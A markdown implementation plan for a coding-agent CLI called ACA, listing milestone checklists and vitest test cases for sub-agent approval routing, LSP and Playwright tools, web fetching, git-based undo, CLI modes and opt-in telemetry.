### M7.1c — `message_agent` + `await_agent` + Lifecycle (Block 2: Delegation)

- [ ] `message_agent` tool: agent_id, message → ack/status
- [ ] `await_agent` tool: agent_id, timeout (0=poll) → result or progress snapshot
- [ ] Lifecycle phases: booting, thinking, tool, waiting
- [ ] Progress snapshot: status, phase, activeTool, lastEventAt, elapsedMs, summary
- [ ] Final result: structured output, token usage, tool call summary
- [ ] Children cannot use `ask_user`/`confirm_action` directly → return `approval_required`

**Tests:**
- Await with timeout=0 → returns progress snapshot (status, phase, elapsed)
- Await with timeout=5000 → blocks up to 5s, returns result or snapshot
- Child completes → await returns final result with token usage
- Child uses ask_user → returns `approval_required` to parent instead
- Message agent → child receives and processes
- Lifecycle phases transition correctly: booting → thinking → tool → thinking → done

### M7.2 — Sub-Agent Approval Routing (Block 8)

- [ ] Child returns `approval_required` with toolCall details and lineage
- [ ] Parent can: satisfy from own authority, bubble up, or deny
- [ ] Root agent prompts user with full lineage chain
- [ ] Session grants propagate downward to requesting child's subtree
- [ ] Pre-authorized patterns at spawn time (via M7.1b pre-auth transport)

**Tests:**
- Child needs approval, parent has authority → auto-satisfied, no user prompt
- Child needs approval, parent lacks authority, parent is root → user prompted with child lineage
- Child needs approval, parent is depth 1, grandparent is root → bubbles twice, root prompts
- Session grant from root → child can reuse for matching actions
- Pre-authorized pattern at spawn → child auto-approves matching actions
- Sibling reuse: grant given to child A → sibling child B can also use it (session-scoped)

---
<!-- Source: 07-milestone7-delegation.md (reordered and split) -->
# ACA Implementation Steps — Milestone 7, Part C: Capabilities & Modes

LSP, browser, web, checkpointing, CLI modes, telemetry. These steps depend on M7A (error handling, health, network policy) being complete.

**Test framework:** vitest
**Test location:** `test/` mirroring `src/` structure

---

## Milestone 7C: Capabilities & Modes

### M7.3 — LSP Integration (Block 2: Code Intelligence)

- [ ] `lsp_query` tool: operation (hover, definition, references, diagnostics, symbols, completions, rename), file, position/scope
- [ ] Thin adapter over `vscode-jsonrpc/node` + `vscode-languageserver-protocol`
- [ ] Lazy lifecycle: start on first query, session-scoped, crash restart once
- [ ] File-extension routing: `.ts`→TypeScript, `.py`→pyright, `.rs`→rust-analyzer, etc.
- [ ] Bundle `typescript-language-server`, others expected on PATH
- [ ] `warming_up` retryable error if init exceeds 10s timeout
- [ ] Rename returns preview only (WorkspaceEdit), does not apply
- [ ] Fallback is explicit: unavailable → structured error, model decides
- [ ] Health integration: crash → M7.13 health state update → M7.7c tool masking if unavailable

**Tests:**
- Hover on TypeScript symbol → returns type info
- Go to definition → returns file path + position
- Find references → returns list of locations
- Rename preview → returns WorkspaceEdit without modifying files
- Server not installed (e.g., rust-analyzer missing) → `LspUnavailable` with install hint
- Server crash → restart once. Second crash → mark unavailable for session (M7.13 integration)
- Warming up (slow init) → retryable error with `warming_up` code
- Multi-language: TypeScript + Rust files → two servers running, correct routing

### M7.4 — Browser Automation (Playwright, Block 3)

- [ ] Browser tools: navigate, click, type, press, snapshot, screenshot, evaluate, extract, wait, close
- [ ] Lazy initialization: first browser tool → launch Chromium headless
- [ ] Session-scoped BrowserContext: persists cookies/state across calls
- [ ] Single active page (v1)
- [ ] Crash recovery: restart once with 2s backoff → unavailable on second crash
- [ ] Process registry integration: PID, idle TTL (1h), hard max (4h)
- [ ] Checkpointing exclusion: `externalEffects: true`
- [ ] Network policy integration: domain checked before navigation (M7.10)

**Tests:**
- Navigate to test page → page loaded (verify via snapshot)
- Click button → DOM state changed
- Type in input → value set
- Screenshot → PNG file created
- State persistence: navigate to login → type credentials → click submit → navigate to dashboard → cookies preserved
- Close → context destroyed. Next call → fresh context
- Crash recovery: kill browser PID → restart succeeds. Kill again → unavailable
- Idle timeout: mock 1h → browser cleaned up
- Network policy: navigate to denied domain → blocked

### M7.5 — Web Capabilities (Block 3)

> Depends on M7.10 (network egress integration) for policy enforcement.

- [ ] `web_search` tool: query, domain filter, recency, limit → ranked results. Provider-abstracted (start with SearXNG or Tavily)
- [ ] `fetch_url` tool: Tier 1 (HTTP + jsdom + readability → markdown). Tier 2 (Playwright fallback for SPAs)
- [ ] `lookup_docs` tool: library, version, query → doc passages
- [ ] Network policy enforcement: all web tools check M2.7/M7.10 policy before any request
- [ ] Output caps: download 2-5 MB, extracted 4-8K chars

**Tests:**
- web_search with mock provider → normalized results (title, url, snippet)
- fetch_url on static HTML page → markdown content extracted
- fetch_url on SPA (JS-rendered) → Tier 1 fails → Tier 2 (Playwright) succeeds
- fetch_url with size cap exceeded → truncated
- Network mode=off → network tools return `network_disabled` error
- Network mode=approved-only, unlisted domain → requires confirmation
- Domain deny list → denied even in open mode
- Localhost exception → auto-allowed regardless of mode (for fetch_url/web_search only)

### M7.6 — Checkpointing / Undo (Block 16)

- [ ] Shadow refs in git: `refs/aca/checkpoints/<session-id>/`
- [ ] Per-turn, lazy: checkpoint created before first workspace-write in a turn
- [ ] Before/after pair: `beforeTurn` and `afterTurn` commits
- [ ] `/undo [N]`: revert last N mutating turns
- [ ] `/restore <id>`: preview changes first, require confirmation before applying. Show diff between current workspace and target checkpoint
- [ ] `/checkpoints`: list recent checkpoints with metadata (turn number, files changed, timestamp)
- [ ] Divergence detection: compare live workspace against last `afterTurn`
- [ ] Manual edit conflict: block restore, require force
- [ ] `externalEffects: true` warning on undo of turns with exec_command
- [ ] Auto-init git repo if none exists

**Tests:**
- edit_file → checkpoint created with beforeTurn and afterTurn
- /undo → files restored to beforeTurn state
- /undo 3 → last 3 mutating turns reverted
- /restore preview: shows diff of what would change before applying
- /restore confirmation: user must confirm after seeing preview
- /restore to specific checkpoint → workspace matches that state
- Read-only turn → no checkpoint created
- Manual edit between turns → divergence detected → undo blocked
- Force override → undo succeeds despite divergence
- exec_command turn → undo restores files but warns about shell side effects
- /checkpoints → lists recent checkpoints with metadata
- Shadow refs invisible to `git branch` and `git log`

### M7.10b — CLI Setup Commands (Block 10)

- [ ] `aca init`: create `~/.aca/` directory structure, `secrets.json` with 0600 permissions, initial `config.json`
- [ ] `aca configure`: interactive configuration wizard (use `@inquirer/prompts` for structured prompts)
- [ ] `aca trust [path]`: mark workspace as trusted in `~/.aca/config.json` `trustedWorkspaces` map
- [ ] `aca untrust [path]`: remove workspace trust

**Tests:**
- `aca init` → creates `~/.aca/`, `secrets.json` with 0600, `config.json` with defaults
- `aca init` when `~/.aca/` exists → no error, preserves existing files
- `aca trust /path/to/project` → `trustedWorkspaces` map updated in user config
- `aca untrust /path/to/project` → entry removed
- `aca trust` without path → uses cwd

### M7.11 — Executor Mode (Block 10, Block 1: Delegation Contract)

Full implementation of the universal capability contract's callee side.

- [ ] `aca describe --json`: output capability descriptor, skip all startup phases
  - Descriptor includes: `contract_version`, `schema_version`, capability name, description, input/output schemas, constraints, supported extensions
- [ ] `aca invoke --json`: read JSON from stdin, execute, write JSON to stdout
  - Request envelope: `contract_version`, `schema_version`, `task`, `input`, `context`, `constraints`, `authority`, `deadline`
  - Response envelope: `contract_version`, `schema_version`, `status`, `result`, `usage` (tokens, cost), `errors`
- [ ] Version compatibility check: contract_version + schema_version major must match
- [ ] Mismatch → `unsupported_version` error on stdout + non-zero exit
- [ ] No streaming (v1): buffer full result
- [ ] Ephemeral non-resumable sessions
- [ ] No stderr output (reserved for catastrophic failures)
- [ ] Exit codes: 0/1/5 (success/runtime/protocol)
- [ ] Authority propagation: `authority` field from request maps to child pre-auth rules

**Tests:**
- `aca describe --json` → valid JSON with contract_version, schema_version, capabilities, input/output schemas
- `aca describe` is fast (< 100ms, no config/session loading)
- `aca invoke` with valid request → structured result on stdout with usage stats
- `aca invoke` with version mismatch → `unsupported_version` error, exit 5
- `aca invoke` with malformed JSON stdin → error, exit 5
- No stderr output during normal execution
- Session is ephemeral: not listed for resume
- Authority propagation: request includes pre-auth patterns → child session honors them
- Response envelope includes token usage and cost

### M7.12 — One-Shot Mode (Block 10)

- [ ] `aca "task text"` → single turn, up to 30 steps
- [ ] Piped input: `echo "task" | aca` → one-shot
- [ ] Text output to stdout, errors to stderr
- [ ] Confirmation handling with TTY → inline prompt. Without TTY + no `--no-confirm` → fail
- [ ] Resume + one-shot: `aca --resume "new task"` → resume session + one turn
- [ ] Exit codes mapped to error categories

**Tests:**
- `aca "echo hello"` with mock provider → output on stdout, exit 0
- Piped input → treated as task, exit 0
- Approval needed, no TTY, no --no-confirm → exit 2
- --no-confirm → approvals auto-granted
- Step limit at 30 → yields with max_steps
- Exit code 1 on runtime error, 2 on cancel

### M7.14 — OpenTelemetry Export (Block 19)

- [ ] Opt-in via `telemetry.enabled: true`
- [ ] `@opentelemetry/api` + `@opentelemetry/exporter-metrics-otlp-http`
- [ ] Aggregate metrics only: session count, tokens, cost, error counts, latency percentiles
- [ ] Never sends: content, file paths, messages, arguments
- [ ] Configurable endpoint and interval (default 300s)
- [ ] Failure → silent drop, no impact on agent

**Tests:**
- telemetry.enabled=false (default) → no OTel initialization
- telemetry.enabled=true → metrics exported to mock endpoint
- Verify: exported data contains only aggregate metrics, no content
- Endpoint unreachable → silent failure, agent unaffected
- Interval: mock clock → export fires at configured interval

---
# ACA Implementation Steps

Concrete, testable execution steps for building Another Coding Agent. Every step references its source block in `fundamentals.md` and specifies what to test. Steps are ordered by dependency within each milestone — complete them sequentially unless noted otherwise.

**Test framework:** vitest
**Test location:** `test/` mirroring `src/` structure (e.g., `src/types/session.ts` → `test/types/session.test.ts`)

---


---

## Cross-Cutting Concerns

These apply throughout implementation, not in a single milestone.

### Test Infrastructure

> **Moved to Phase 0.3.** M1 and M4 depend on mock provider, fixtures, and snapshot testing. These must exist before implementation begins.

### Continuous Integration

- [ ] All tests run on every commit
- [ ] TypeScript strict mode, no `any` escape hatches — add ESLint rule `@typescript-eslint/no-explicit-any` (TypeScript `strict` alone doesn't prevent explicit `any`)
- [ ] Build produces a runnable binary
- [ ] Mock provider: scoped to NanoGPT in M1, extended to multi-provider (Anthropic, OpenAI response formats) before M5 tests

---
